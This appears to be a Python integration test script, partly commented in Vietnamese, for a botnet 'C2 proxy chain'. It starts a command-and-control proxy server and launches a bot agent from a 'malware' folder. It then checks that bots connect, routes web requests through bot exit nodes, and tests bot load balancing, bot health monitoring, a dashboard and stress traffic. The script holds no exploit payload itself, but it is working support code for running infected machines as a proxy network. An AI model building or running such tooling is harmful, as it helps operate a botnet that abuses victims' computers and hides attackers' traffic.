#!/usr/bin/env python3
"""
PROXY INTEGRATION TEST
Test toàn bộ hệ thống C2 proxy chain
"""

import os
import sys
import time
import socket
import threading
import subprocess
import requests
from datetime import datetime
import json

# Add current directory to path for imports
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

class ProxyIntegrationTest:
    def __init__(self):
        self.test_results = []
        self.c2_host = "127.0.0.1"
        self.c2_port = 7777
        self.proxy_port = 8080
        self.dashboard_port = 5000
        
        # Test targets
        self.test_targets = [
            "http://httpbin.org/ip",
            "http://httpbin.org/user-agent",
            "http://httpbin.org/headers",
            "https://httpbin.org/ip"
        ]
        
    def log_test(self, test_name: str, success: bool, message: str = ""):
        """Log test result"""
        status = "✅ PASS" if success else "❌ FAIL"
        timestamp = datetime.now().strftime("%H:%M:%S")
        result = f"[{timestamp}] {status} {test_name}"
        if message:
            result += f" - {message}"
        
        print(result)
        self.test_results.append({
            'test_name': test_name,
            'success': success,
            'message': message,
            'timestamp': timestamp
        })
        
    def test_c2_proxy_server_startup(self):
        """Test C2 proxy server startup"""
        try:
            # Import and test C2 proxy server
            from c2_proxy_server import C2ProxyServer
            
            server = C2ProxyServer(self.c2_host, self.c2_port, self.proxy_port)
            
            # Start server in separate thread
            server_thread = threading.Thread(target=server.start, daemon=True)
            server_thread.start()
            
            # Wait for server to start
            time.sleep(3)
            
            # Check if server is running
            if server.running:
                self.log_test("C2 Proxy Server Startup", True, "Server started successfully")
                return server
            else:
                self.log_test("C2 Proxy Server Startup", False, "Server failed to start")
                return None
                
        except Exception as e:
            self.log_test("C2 Proxy Server Startup", False, f"Error: {e}")
            return None
            
    def test_bot_agent_connection(self, server):
        """Test bot agent connection to C2"""
        try:
            # Start bot agent in separate process
            bot_script = os.path.join(os.path.dirname(__file__), "..", "bane", "malware", "bot_agent.py")
            
            if not os.path.exists(bot_script):
                self.log_test("Bot Agent Connection", False, "Bot agent script not found")
                return False
                
            # Start bot agent
            bot_process = subprocess.Popen([
                sys.executable, bot_script,
                "--c2-host", self.c2_host,
                "--c2-port", str(self.c2_port)
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for bot to connect
            time.sleep(5)
            
            # Check if bot is connected
            if server.connected_bots:
                self.log_test("Bot Agent Connection", True, f"{len(server.connected_bots)} bot(s) connected")
                return True
            else:
                self.log_test("Bot Agent Connection", False, "No bots connected")
                return False
                
        except Exception as e:
            self.log_test("Bot Agent Connection", False, f"Error: {e}")
            return False
            
    def test_proxy_functionality(self, server):
        """Test proxy functionality"""
        try:
            # Wait for bot to be ready
            time.sleep(2)
            
            # Test HTTP proxy
            proxy_url = f"http://{self.c2_host}:{self.proxy_port}"
            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            success_count = 0
            total_tests = len(self.test_targets)
            
            for target in self.test_targets:
                try:
                    response = requests.get(target, proxies=proxies, timeout=10)
                    if response.status_code == 200:
                        success_count += 1
                        print(f"  ✅ {target} - Status: {response.status_code}")
                    else:
                        print(f"  ❌ {target} - Status: {response.status_code}")
                except Exception as e:
                    print(f"  ❌ {target} - Error: {e}")
                    
            success_rate = (success_count / total_tests) * 100
            
            if success_rate >= 80:
                self.log_test("Proxy Functionality", True, f"{success_count}/{total_tests} requests successful ({success_rate:.1f}%)")
                return True
            else:
                self.log_test("Proxy Functionality", False, f"Only {success_count}/{total_tests} requests successful ({success_rate:.1f}%)")
                return False
                
        except Exception as e:
            self.log_test("Proxy Functionality", False, f"Error: {e}")
            return False
            
    def test_load_balancer(self, server):
        """Test load balancer functionality"""
        try:
            from proxy_load_balancer import ProxyLoadBalancer
            
            lb = ProxyLoadBalancer()
            
            # Register test bots
            for bot_id in server.connected_bots.keys():
                lb.register_bot(bot_id, {'max_connections': 50, 'weight': 1})
                
            # Test different strategies
            strategies = ['round_robin', 'least_connections', 'health_based', 'random']
            successful_selections = 0
            
            for strategy in strategies:
                selected_bot = lb.select_bot(strategy)
                if selected_bot:
                    successful_selections += 1
                    print(f"  ✅ {strategy}: Selected {selected_bot}")
                else:
                    print(f"  ❌ {strategy}: No bot selected")
                    
            if successful_selections >= len(strategies) * 0.75:
                self.log_test("Load Balancer", True, f"{successful_selections}/{len(strategies)} strategies working")
                return True
            else:
                self.log_test("Load Balancer", False, f"Only {successful_selections}/{len(strategies)} strategies working")
                return False
                
        except Exception as e:
            self.log_test("Load Balancer", False, f"Error: {e}")
            return False
            
    def test_health_monitoring(self, server):
        """Test health monitoring"""
        try:
            from proxy_load_balancer import BotHealthMonitor
            
            health_monitor = BotHealthMonitor()
            
            # Check health status
            health_status = health_monitor.get_health_status(server.bot_exit_nodes)
            
            if health_status['status'] in ['excellent', 'good', 'warning']:
                self.log_test("Health Monitoring", True, f"Health status: {health_status['status']}")
                return True
            else:
                self.log_test("Health Monitoring", False, f"Health status: {health_status['status']}")
                return False
                
        except Exception as e:
            self.log_test("Health Monitoring", False, f"Error: {e}")
            return False
            
    def test_web_dashboard(self):
        """Test web dashboard"""
        try:
            # Start dashboard in separate process
            dashboard_script = os.path.join(os.path.dirname(__file__), "proxy_web_dashboard.py")
            
            if not os.path.exists(dashboard_script):
                self.log_test("Web Dashboard", False, "Dashboard script not found")
                return False
                
            # Start dashboard
            dashboard_process = subprocess.Popen([
                sys.executable, dashboard_script,
                "--host", self.c2_host,
                "--port", str(self.dashboard_port)
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for dashboard to start
            time.sleep(5)
            
            # Test dashboard endpoints
            try:
                response = requests.get(f"http://{self.c2_host}:{self.dashboard_port}/", timeout=10)
                if response.status_code == 200:
                    self.log_test("Web Dashboard", True, "Dashboard accessible")
                    return True
                else:
                    self.log_test("Web Dashboard", False, f"Dashboard returned status {response.status_code}")
                    return False
            except Exception as e:
                self.log_test("Web Dashboard", False, f"Error accessing dashboard: {e}")
                return False
                
        except Exception as e:
            self.log_test("Web Dashboard", False, f"Error: {e}")
            return False
            
    def test_stress_testing(self, server):
        """Test stress testing with multiple requests"""
        try:
            proxy_url = f"http://{self.c2_host}:{self.proxy_port}"
            proxies = {'http': proxy_url, 'https': proxy_url}
            
            # Send multiple concurrent requests
            def make_request():
                try:
                    response = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
                    return response.status_code == 200
                except:
                    return False
                    
            # Create multiple threads
            threads = []
            results = []
            
            for i in range(20):  # 20 concurrent requests
                thread = threading.Thread(target=lambda: results.append(make_request()))
                threads.append(thread)
                thread.start()
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            successful_requests = sum(results)
            success_rate = (successful_requests / len(results)) * 100
            
            if success_rate >= 70:
                self.log_test("Stress Testing", True, f"{successful_requests}/{len(results)} requests successful ({success_rate:.1f}%)")
                return True
            else:
                self.log_test("Stress Testing", False, f"Only {successful_requests}/{len(results)} requests successful ({success_rate:.1f}%)")
                return False
                
        except Exception as e:
            self.log_test("Stress Testing", False, f"Error: {e}")
            return False
            
    def test_error_handling(self, server):
        """Test error handling"""
        try:
            # Test with invalid proxy
            invalid_proxy = f"http://{self.c2_host}:9999"
            proxies = {'http': invalid_proxy}
            
            try:
                response = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
                self.log_test("Error Handling", False, "Should have failed with invalid proxy")
                return False
            except:
                pass  # Expected to fail
                
            # Test with invalid target
            proxy_url = f"http://{self.c2_host}:{self.proxy_port}"
            proxies = {'http': proxy_url}
            
            try:
                response = requests.get("http://invalid-target-12345.com", proxies=proxies, timeout=5)
                # Should either succeed or fail gracefully
                self.log_test("Error Handling", True, "Handled invalid target gracefully")
                return True
            except:
                self.log_test("Error Handling", True, "Handled invalid target gracefully")
                return True
                
        except Exception as e:
            self.log_test("Error Handling", False, f"Error: {e}")
            return False
            
    def run_all_tests(self):
        """Run all integration tests"""
        print("🧪 Starting C2 Proxy Integration Tests...")
        print("=" * 60)
        
        # Test 1: C2 Proxy Server Startup
        server = self.test_c2_proxy_server_startup()
        if not server:
            print("❌ Cannot continue without C2 server")
            return
            
        # Test 2: Bot Agent Connection
        bot_connected = self.test_bot_agent_connection(server)
        if not bot_connected:
            print("⚠️  Continuing without bot connection...")
            
        # Test 3: Proxy Functionality
        if bot_connected:
            self.test_proxy_functionality(server)
            
        # Test 4: Load Balancer
        self.test_load_balancer(server)
        
        # Test 5: Health Monitoring
        self.test_health_monitoring(server)
        
        # Test 6: Web Dashboard
        self.test_web_dashboard()
        
        # Test 7: Stress Testing
        if bot_connected:
            self.test_stress_testing(server)
            
        # Test 8: Error Handling
        self.test_error_handling(server)
        
        # Print summary
        self.print_test_summary()
        
        # Cleanup
        if server:
            server.stop()
            
    def print_test_summary(self):
        """Print test summary"""
        print("\n" + "=" * 60)
        print("📊 TEST SUMMARY")
        print("=" * 60)
        
        total_tests = len(self.test_results)
        passed_tests = sum(1 for result in self.test_results if result['success'])
        failed_tests = total_tests - passed_tests
        
        print(f"Total Tests: {total_tests}")
        print(f"Passed: {passed_tests}")
        print(f"Failed: {failed_tests}")
        print(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%")
        
        if failed_tests > 0:
            print("\n❌ FAILED TESTS:")
            for result in self.test_results:
                if not result['success']:
                    print(f"  - {result['test_name']}: {result['message']}")
                    
        print("\n✅ PASSED TESTS:")
        for result in self.test_results:
            if result['success']:
                print(f"  - {result['test_name']}")
                
        # Save results to file
        results_file = f"test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(results_file, 'w') as f:
            json.dump(self.test_results, f, indent=2)
        print(f"\n📄 Test results saved to: {results_file}")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description="C2 Proxy Integration Test")
    parser.add_argument("--c2-host", default="127.0.0.1", help="C2 server host")
    parser.add_argument("--c2-port", type=int, default=7777, help="C2 server port")
    parser.add_argument("--proxy-port", type=int, default=8080, help="Proxy server port")
    parser.add_argument("--dashboard-port", type=int, default=5000, help="Dashboard port")
    
    args = parser.parse_args()
    
    # Create test instance
    test = ProxyIntegrationTest()
    test.c2_host = args.c2_host
    test.c2_port = args.c2_port
    test.proxy_port = args.proxy_port
    test.dashboard_port = args.dashboard_port
    
    # Run tests
    test.run_all_tests()

if __name__ == "__main__":
    main()
